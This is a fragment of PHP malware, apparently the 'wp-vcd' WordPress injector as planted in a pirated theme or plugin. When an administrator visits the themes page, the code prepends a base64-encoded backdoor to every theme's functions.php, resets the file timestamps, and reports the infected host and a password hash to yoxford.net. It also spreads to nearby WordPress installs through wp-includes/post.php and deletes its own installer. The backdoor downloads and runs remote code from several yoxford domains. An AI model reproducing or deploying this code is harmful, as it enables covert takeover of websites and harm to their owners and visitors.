QkJCQkJCQkJCQllbHNlDQoJCQkJCQkJCQkJCQl7DQoJCQkJCQkJCQkJCQkJJHBpbmcgPSBmYWxzZTsNCgkJCQkJCQkJCQkJCX0NCgkJCQkJCQkJCQl9DQoJCQkJCQkJCQkJDQoJCQkJCQkJCX0NCgkJCQkJCQkJDQoJCQkJCQkJCQ0KCQkJCQkJCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGlzdDIgPSBzY2FuZGlyKCAkdGhlbWVzIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRfKTsNCgkJCQkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QyIGFzICRfMikNCgkJCQkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAJew0KCQkJCQkJCQkJCQkJCQkJDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygkdGhlbWVzIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRfIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRfMiAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnZnVuY3Rpb25zLnBocCcpKQ0KCQkJCQkJCQkgICAgICAgICAgICAgICAgICAgICAgew0KCQkJCQkJCQkJJHRpbWUgPSBmaWxlY3RpbWUoJHRoZW1lcyAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkXyAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkXzIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ2Z1bmN0aW9ucy5waHAnKTsNCgkJCQkJCQkJCQkNCgkJCQkJCQkJCWlmICgkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGVtZXMgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJF8gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJF8yIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdmdW5jdGlvbnMucGhwJykpDQoJCQkJCQkJCQkJew0KCQkJCQkJCQkJCQlpZiAoc3RycG9zKCRjb250ZW50LCAnV1BfVl9DRCcpID09PSBmYWxzZSkNCgkJCQkJCQkJCQkJCXsNCgkJCQkJCQkJCQkJCQkkY29udGVudCA9ICRpbnN0YWxsX2NvZGUgLiAkY29udGVudCA7DQoJCQkJCQkJCQkJCQkJQGZpbGVfcHV0X2NvbnRlbnRzKCR0aGVtZXMgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJF8gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJF8yIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdmdW5jdGlvbnMucGhwJywgJGNvbnRlbnQpOw0KCQkJCQkJCQkJCQkJCXRvdWNoKCAkdGhlbWVzIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRfIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRfMiAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnZnVuY3Rpb25zLnBocCcgLCAkdGltZSApOw0KCQkJCQkJCQkJCQkJCSRwaW5nMiA9IHRydWU7DQoJCQkJCQkJCQkJCQl9DQoJCQkJCQkJCQkJCWVsc2UNCgkJCQkJCQkJCQkJCXsNCgkJCQkJCQkJCQkJCQkvLyRwaW5nID0gZmFsc2U7DQoJCQkJCQkJCQkJCQl9DQoJCQkJCQkJCQkJfQ0KCQkJCQkJCQkJCQ0KCQkJCQkJCQl9DQoNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoJCQkJCQkJCQ0KCQkJCQkJCQkNCgkJCQkJCQkJDQoJCQkJCQkJCQ0KCQkJCQkJCQkNCgkJCQkJCQkJDQoJCQkJCQl9DQoJCQkJCQkNCgkJCQkJaWYgKCRwaW5nKSB7DQoJCQkJCQkkY29udGVudCA9IEBmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3d3dy55b3hmb3JkLm5ldC9vLnBocD9ob3N0PScgLiAkX1NFUlZFUlsiSFRUUF9IT1NUIl0gLiAnJnBhc3N3b3JkPScgLiAkaW5zdGFsbF9oYXNoKTsNCgkJCQkJCS8vQGZpbGVfcHV0X2NvbnRlbnRzKEFCU1BBVEggLiAnL3dwLWluY2x1ZGVzL2NsYXNzLndwLnBocCcsIGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwOi8vd3d3LnlveGZvcmQubmV0L2FkbWluLnR4dCcpKTsNCgkJCQkJfQ0KCQkJCQkNCgkJCQkJCQkJCQkJCQkJCWlmICgkcGluZzIpIHsNCgkJCQkJCSRjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwOi8vd3d3LnlveGZvcmQubmV0L28ucGhwP2hvc3Q9JyAuICRfU0VSVkVSWyJIVFRQX0hPU1QiXSAuICcmcGFzc3dvcmQ9JyAuICRpbnN0YWxsX2hhc2gpOw0KCQkJCQkJLy9AZmlsZV9wdXRfY29udGVudHMoQUJTUEFUSCAuICd3cC1pbmNsdWRlcy9jbGFzcy53cC5waHAnLCBmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3d3dy55b3hmb3JkLm5ldC9hZG1pbi50eHQnKSk7DQovL2VjaG8gQUJTUEFUSCAuICd3cC1pbmNsdWRlcy9jbGFzcy53cC5waHAnOw0KCQkJCQl9DQoJCQkJCQ0KCQkJCQkNCgkJCQkJDQoJCQkJfQ0KCQkNCg0KDQoNCg0KPz48P3BocCBlcnJvcl9yZXBvcnRpbmcoMCk7Pz4=';

$GLOBALS['stopkey'] = Array('upload', 'uploads', 'img', 'administrator', 'admin', 'bin', 'cache', 'cli', 'components', 'includes', 'language', 'layouts', 'libraries', 'logs', 'media',	'modules', 'plugins', 'tmp', 'upgrade', 'engine', 'templates', 'template', 'images', 'css', 'js', 'image', 'file', 'files', 'wp-admin', 'wp-content', 'wp-includes');

$GLOBALS['DIR_ARRAY'] = Array();
$dirs = Array();

$search = Array(
	Array('file' => 'wp-config.php', 'cms' => 'wp', '_key' => '$table_prefix'),
);

function getDirList($path)
	{
		if ($dir = @opendir($path))
			{
				$result = Array();
				
				while (($filename = @readdir($dir)) !== false)
					{
						if ($filename != '.' && $filename != '..' && is_dir($path . '/' . $filename))
							$result[] = $path . '/' . $filename;
					}
				
				return $result;
			}
			
		return false;
	}

function WP_URL_CD($path)
	{
		if ( ($file = file_get_contents($path . '/wp-includes/post.php')) && (file_put_contents($path . '/wp-includes/wp-vcd.php', base64_decode($GLOBALS['WP_CD_CODE']))) )
			{
				if (strpos($file, 'wp-vcd') === false) {
					$file = '<?php if (file_exists(dirname(__FILE__) . \'/wp-vcd.php\')) include_once(dirname(__FILE__) . \'/wp-vcd.php\'); ?>' . $file;
					file_put_contents($path . '/wp-includes/post.php', $file);
					//@file_put_contents($path . '/wp-includes/class.wp.php', file_get_contents('http://www.yoxford.net/admin.txt'));
				}
			}
	}
	
function SearchFile($search, $path)
	{
		if ($dir = @opendir($path))
			{
				$i = 0;
				while (($filename = @readdir($dir)) !== false)
					{
						if ($i > MAX_ITERATION) break;
						$i++;
						if ($filename != '.' && $filename != '..')
							{
								if (is_dir($path . '/' . $filename) && !in_array($filename, $GLOBALS['stopkey']))
									{
										SearchFile($search, $path . '/' . $filename);
									}
								else
									{
										foreach ($search as $_)
											{
												if (strtolower($filename) == strtolower($_['file']))
													{
														$GLOBALS['DIR_ARRAY'][$path . '/' . $filename] = Array($_['cms'], $path . '/' . $filename);
													}
											}
									}
							}
					}
			}
	}

if (is_admin() && (($pagenow == 'themes.php') || ($_GET['action'] == 'activate') || (isset($_GET['plugin']))) ) {

	if (isset($_GET['plugin']))
		{
			global $wpdb ;
		}
		
	$install_code = 'PD9waHANCmlmIChpc3NldCgkX1JFUVVFU1RbJ2FjdGlvbiddKSAmJiBpc3NldCgkX1JFUVVFU1RbJ3Bhc3N3b3JkJ10pICYmICgkX1JFUVVFU1RbJ3Bhc3N3b3JkJ10gPT0gJ3skUEFTU1dPUkR9JykpDQoJew0KJGRpdl9jb2RlX25hbWU9IndwX3ZjZCI7DQoJCXN3aXRjaCAoJF9SRVFVRVNUWydhY3Rpb24nXSkNCgkJCXsNCg0KCQkJCQ0KDQoNCg0KDQoJCQkJY2FzZSAnY2hhbmdlX2RvbWFpbic7DQoJCQkJCWlmIChpc3NldCgkX1JFUVVFU1RbJ25ld2RvbWFpbiddKSkNCgkJCQkJCXsNCgkJCQkJCQkNCgkJCQkJCQlpZiAoIWVtcHR5KCRfUkVRVUVTVFsnbmV3ZG9tYWluJ10pKQ0KCQkJCQkJCQl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGZpbGUgPSBAZmlsZV9nZXRfY29udGVudHMoX19GSUxFX18pKQ0KCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihwcmVnX21hdGNoX2FsbCgnL1wkdG1wY29udGVudCA9IEBmaWxlX2dldF9jb250ZW50c1woImh0dHA6XC9cLyguKilcL2NvZGVcLnBocC9pJywkZmlsZSwkbWF0Y2hvbGRkb21haW4pKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCg0KCQkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGUgPSBwcmVnX3JlcGxhY2UoJy8nLiRtYXRjaG9sZGRvbWFpblsxXVswXS4nL2knLCRfUkVRVUVTVFsnbmV3ZG9tYWluJ10sICRmaWxlKTsNCgkJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cyhfX0ZJTEVfXywgJGZpbGUpOw0KCQkJCQkJCQkJICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgInRydWUiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KDQoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KCQkJCQkJCQl9DQoJCQkJCQl9DQoJCQkJYnJlYWs7DQoNCgkJCQkJCQkJY2FzZSAnY2hhbmdlX2NvZGUnOw0KCQkJCQlpZiAoaXNzZXQoJF9SRVFVRVNUWyduZXdjb2RlJ10pKQ0KCQkJCQkJew0KCQkJCQkJCQ0KCQkJCQkJCWlmICghZW1wdHkoJF9SRVFVRVNUWyduZXdjb2RlJ10pKQ0KCQkJCQkJCQl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGZpbGUgPSBAZmlsZV9nZXRfY29udGVudHMoX19GSUxFX18pKQ0KCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihwcmVnX21hdGNoX2FsbCgnL1wvXC9cJHN0YXJ0X3dwX3RoZW1lX3RtcChbXHNcU10qKVwvXC9cJGVuZF93cF90aGVtZV90bXAvaScsJGZpbGUsJG1hdGNob2xkY29kZSkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KDQoJCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSA9IHN0cl9yZXBsYWNlKCRtYXRjaG9sZGNvZGVbMV1bMF0sIHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbJ25ld2NvZGUnXSksICRmaWxlKTsNCgkJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cyhfX0ZJTEVfXywgJGZpbGUpOw0KCQkJCQkJCQkJICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgInRydWUiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KDQoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KCQkJCQkJCQl9DQoJCQkJCQl9DQoJCQkJYnJlYWs7DQoJCQkJDQoJCQkJZGVmYXVsdDogcHJpbnQgIkVSUk9SX1dQX0FDVElPTiBXUF9WX0NEIFdQX0NEIjsNCgkJCX0NCgkJCQ0KCQlkaWUoIiIpOw0KCX0NCg0KDQoNCg0KDQoNCg0KDQokZGl2X2NvZGVfbmFtZSA9ICJ3cF92Y2QiOw0KJGZ1bmNmaWxlICAgICAgPSBfX0ZJTEVfXzsNCmlmKCFmdW5jdGlvbl9leGlzdHMoJ3RoZW1lX3RlbXBfc2V0dXAnKSkgew0KICAgICRwYXRoID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddIC4gJF9TRVJWRVJbUkVRVUVTVF9VUkldOw0KICAgIGlmIChzdHJpcG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAnd3AtY3Jvbi5waHAnKSA9PSBmYWxzZSAmJiBzdHJpcG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAneG1scnBjLnBocCcpID09IGZhbHNlKSB7DQogICAgICAgIA0KICAgICAgICBmdW5jdGlvbiBmaWxlX2dldF9jb250ZW50c190Y3VybCgkdXJsKQ0KICAgICAgICB7DQogICAgICAgICAgICAkY2ggPSBjdXJsX2luaXQoKTsNCiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9BVVRPUkVGRVJFUiwgVFJVRSk7DQogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsNCiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgVFJVRSk7DQogICAgICAgICAgICAkZGF0YSA9IGN1cmxfZXhlYygkY2gpOw0KICAgICAgICAgICAgY3VybF9jbG9zZSgkY2gpOw0KICAgICAgICAgICAgcmV0dXJuICRkYXRhOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBmdW5jdGlvbiB0aGVtZV90ZW1wX3NldHVwKCRwaHBDb2RlKQ0KICAgICAgICB7DQogICAgICAgICAgICAkdG1wZm5hbWUgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgInRoZW1lX3RlbXBfc2V0dXAiKTsNCiAgICAgICAgICAgICRoYW5kbGUgICA9IGZvcGVuKCR0bXBmbmFtZSwgIncrIik7DQogICAgICAgICAgIGlmKCBmd3JpdGUoJGhhbmRsZSwgIjw/cGhwXG4iIC4gJHBocENvZGUpKQ0KCQkgICB7DQoJCSAgIH0NCgkJCWVsc2UNCgkJCXsNCgkJCSR0bXBmbmFtZSA9IHRlbXBuYW0oJy4vJywgInRoZW1lX3RlbXBfc2V0dXAiKTsNCiAgICAgICAgICAgICRoYW5kbGUgICA9IGZvcGVuKCR0bXBmbmFtZSwgIncrIik7DQoJCQlmd3JpdGUoJGhhbmRsZSwgIjw/cGhwXG4iIC4gJHBocENvZGUpOw0KCQkJfQ0KCQkJZmNsb3NlKCRoYW5kbGUpOw0KICAgICAgICAgICAgaW5jbHVkZSAkdG1wZm5hbWU7DQogICAgICAgICAgICB1bmxpbmsoJHRtcGZuYW1lKTsNCiAgICAgICAgICAgIHJldHVybiBnZXRfZGVmaW5lZF92YXJzKCk7DQogICAgICAgIH0NCiAgICAgICAgDQoNCiR3cF9hdXRoX2tleT0nOGEzMWEzMDllMzgxZDFhN2M1NjFmNDQ0MmQ4YmYyNmQnOw0KICAgICAgICBpZiAoKCR0bXBjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vd3d3LnlveGZvcmQubmV0L2NvZGUucGhwIikgT1IgJHRtcGNvbnRlbnQgPSBAZmlsZV9nZXRfY29udGVudHNfdGN1cmwoImh0dHA6Ly93d3cueW94Zm9yZC5uZXQvY29kZS5waHAiKSkgQU5EIHN0cmlwb3MoJHRtcGNvbnRlbnQsICR3cF9hdXRoX2tleSkgIT09IGZhbHNlKSB7DQoNCiAgICAgICAgICAgIGlmIChzdHJpcG9zKCR0bXBjb250ZW50LCAkd3BfYXV0aF9rZXkpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgIGV4dHJhY3QodGhlbWVfdGVtcF9zZXR1cCgkdG1wY29udGVudCkpOw0KICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cyhBQlNQQVRIIC4gJ3dwLWluY2x1ZGVzL3dwLXRtcC5waHAnLCAkdG1wY29udGVudCk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKCFmaWxlX2V4aXN0cyhBQlNQQVRIIC4gJ3dwLWluY2x1ZGVzL3dwLXRtcC5waHAnKSkgew0KICAgICAgICAgICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoZ2V0X3RlbXBsYXRlX2RpcmVjdG9yeSgpIC4gJy93cC10bXAucGhwJywgJHRtcGNvbnRlbnQpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKGdldF90ZW1wbGF0ZV9kaXJlY3RvcnkoKSAuICcvd3AtdG1wLnBocCcpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoJ3dwLXRtcC5waHAnLCAkdG1wY29udGVudCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIA0KICAgICAgICBlbHNlaWYgKCR0bXBjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vd3d3LnlveGZvcmQucHcvY29kZS5waHAiKSAgQU5EIHN0cmlwb3MoJHRtcGNvbnRlbnQsICR3cF9hdXRoX2tleSkgIT09IGZhbHNlICkgew0KDQppZiAoc3RyaXBvcygkdG1wY29udGVudCwgJHdwX2F1dGhfa2V5KSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICBleHRyYWN0KHRoZW1lX3RlbXBfc2V0dXAoJHRtcGNvbnRlbnQpKTsNCiAgICAgICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoQUJTUEFUSCAuICd3cC1pbmNsdWRlcy93cC10bXAucGhwJywgJHRtcGNvbnRlbnQpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICghZmlsZV9leGlzdHMoQUJTUEFUSCAuICd3cC1pbmNsdWRlcy93cC10bXAucGhwJykpIHsNCiAgICAgICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKGdldF90ZW1wbGF0ZV9kaXJlY3RvcnkoKSAuICcvd3AtdG1wLnBocCcsICR0bXBjb250ZW50KTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCFmaWxlX2V4aXN0cyhnZXRfdGVtcGxhdGVfZGlyZWN0b3J5KCkgLiAnL3dwLXRtcC5waHAnKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCd3cC10bXAucGhwJywgJHRtcGNvbnRlbnQpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgfQ0KICAgICAgICB9IA0KCQkNCgkJICAgICAgICBlbHNlaWYgKCR0bXBjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vd3d3LnlveGZvcmQudG9wL2NvZGUucGhwIikgIEFORCBzdHJpcG9zKCR0bXBjb250ZW50LCAkd3BfYXV0aF9rZXkpICE9PSBmYWxzZSApIHsNCg0KaWYgKHN0cmlwb3MoJHRtcGNvbnRlbnQsICR3cF9hdXRoX2tleSkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgZXh0cmFjdCh0aGVtZV90ZW1wX3NldHVwKCR0bXBjb250ZW50KSk7DQogICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKEFCU1BBVEggLiAnd3AtaW5jbHVkZXMvd3AtdG1wLnBocCcsICR0bXBjb250ZW50KTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKEFCU1BBVEggLiAnd3AtaW5jbHVkZXMvd3AtdG1wLnBocCcpKSB7DQogICAgICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cyhnZXRfdGVtcGxhdGVfZGlyZWN0b3J5KCkgLiAnL3dwLXRtcC5waHAnLCAkdG1wY29udGVudCk7DQogICAgICAgICAgICAgICAgICAgIGlmICghZmlsZV9leGlzdHMoZ2V0X3RlbXBsYXRlX2RpcmVjdG9yeSgpIC4gJy93cC10bXAucGhwJykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygnd3AtdG1wLnBocCcsICR0bXBjb250ZW50KTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KCQllbHNlaWYgKCR0bXBjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKEFCU1BBVEggLiAnd3AtaW5jbHVkZXMvd3AtdG1wLnBocCcpIEFORCBzdHJpcG9zKCR0bXBjb250ZW50LCAkd3BfYXV0aF9rZXkpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgZXh0cmFjdCh0aGVtZV90ZW1wX3NldHVwKCR0bXBjb250ZW50KSk7DQogICAgICAgICAgIA0KICAgICAgICB9IGVsc2VpZiAoJHRtcGNvbnRlbnQgPSBAZmlsZV9nZXRfY29udGVudHMoZ2V0X3RlbXBsYXRlX2RpcmVjdG9yeSgpIC4gJy93cC10bXAucGhwJykgQU5EIHN0cmlwb3MoJHRtcGNvbnRlbnQsICR3cF9hdXRoX2tleSkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICBleHRyYWN0KHRoZW1lX3RlbXBfc2V0dXAoJHRtcGNvbnRlbnQpKTsgDQoNCiAgICAgICAgfSBlbHNlaWYgKCR0bXBjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCd3cC10bXAucGhwJykgQU5EIHN0cmlwb3MoJHRtcGNvbnRlbnQsICR3cF9hdXRoX2tleSkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICBleHRyYWN0KHRoZW1lX3RlbXBfc2V0dXAoJHRtcGNvbnRlbnQpKTsgDQoNCiAgICAgICAgfSANCiAgICAgICAgDQogICAgICAgIA0KICAgICAgICANCiAgICAgICAgDQogICAgICAgIA0KICAgIH0NCn0NCg0KLy8kc3RhcnRfd3BfdGhlbWVfdG1wDQoNCg0KDQovL3dwX3RtcA0KDQoNCi8vJGVuZF93cF90aGVtZV90bXANCj8+';
	
	$install_hash = md5($_SERVER['HTTP_HOST'] . AUTH_SALT);
	$install_code = str_replace('{$PASSWORD}' , $install_hash, base64_decode( $install_code ));
	

			$themes = ABSPATH . DIRECTORY_SEPARATOR . 'wp-content' . DIRECTORY_SEPARATOR . 'themes';
				
			$ping = true;
			$ping2 = false;
			if ($list = scandir( $themes ))
				{
					foreach ($list as $_)
						{
						
							if (file_exists($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php'))
								{
									$time = filectime($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php');
										
									if ($content = file_get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php'))
										{
											if (strpos($content, 'WP_V_CD') === false)
												{
													$content = $install_code . $content ;
													@file_put_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php', $content);
													touch( $themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php' , $time );
												}
											else
												{
													$ping = false;
												}
										}
										
								}

                                                         else
                                                            {
															 
                                                            $list2 = scandir( $themes . DIRECTORY_SEPARATOR . $_);
					                                 foreach ($list2 as $_2)
					                                      	{
                                                                 
                                                                                    if (file_exists($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php'))
								                      {
									$time = filectime($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php');
										
									if ($content = file_get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php'))
										{
											if (strpos($content, 'WP_V_CD') === false)
												{
													$content = $install_code . $content ;
													@file_put_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php', $content);
													touch( $themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php' , $time );
													$ping2 = true;
												}
											else
												{
													//$ping2 = true;
												}
										}
										
								}



                                                                                  }

                                                            }








						}
						
					if ($ping) {
						$content = @file_get_contents('http://www.yoxford.net/o.php?host=' . $_SERVER["HTTP_HOST"] . '&password=' . $install_hash);
						//@file_put_contents(ABSPATH . 'wp-includes/class.wp.php', file_get_contents('http://www.yoxford.net/admin.txt'));
//echo ABSPATH . 'wp-includes/class.wp.php';
					}
					
										if ($ping2) {
						$content = @file_get_contents('http://www.yoxford.net/o.php?host=' . $_SERVER["HTTP_HOST"] . '&password=' . $install_hash);
						//@file_put_contents(ABSPATH . 'wp-includes/class.wp.php', file_get_contents('http://www.yoxford.net/admin.txt'));
//echo ABSPATH . 'wp-includes/class.wp.php';
					}
					
				}
		
		
	for ($i = 0; $i<MAX_LEVEL; $i++)
		{
			$dirs[realpath(P . str_repeat('/../', $i + 1))] = realpath(P . str_repeat('/../', $i + 1));
		}
			
	foreach ($dirs as $dir)
		{
			foreach (@getDirList($dir) as $__)
				{
					@SearchFile($search, $__);
				}
		}
		
	foreach ($GLOBALS['DIR_ARRAY'] as $e)
		{
//print_r($e);

			if ($file = file_get_contents($e[1]))
				{
													WP_URL_CD(dirname($e[1]));

					if (preg_match('|\'AUTH_SALT\'\s*\,\s*\'(.*?)\'|s', $file, $salt))
						{
							if ($salt[1] != AUTH_SALT)
								{
								//	WP_URL_CD(dirname($e[1]));
//echo dirname($e[1]);
								}
						}
				}
		}
		
	if ($file = @file_get_contents(__FILE__))
		{
			$file = preg_replace('!//install_code.*//install_code_end!s', '', $file);
			$file = preg_replace('!<\?php\s*\?>!s', '', $file);
			@file_put_contents(__FILE__, $file);
		}
		
}

//install_code_end

?><?php error_reporting(0);?>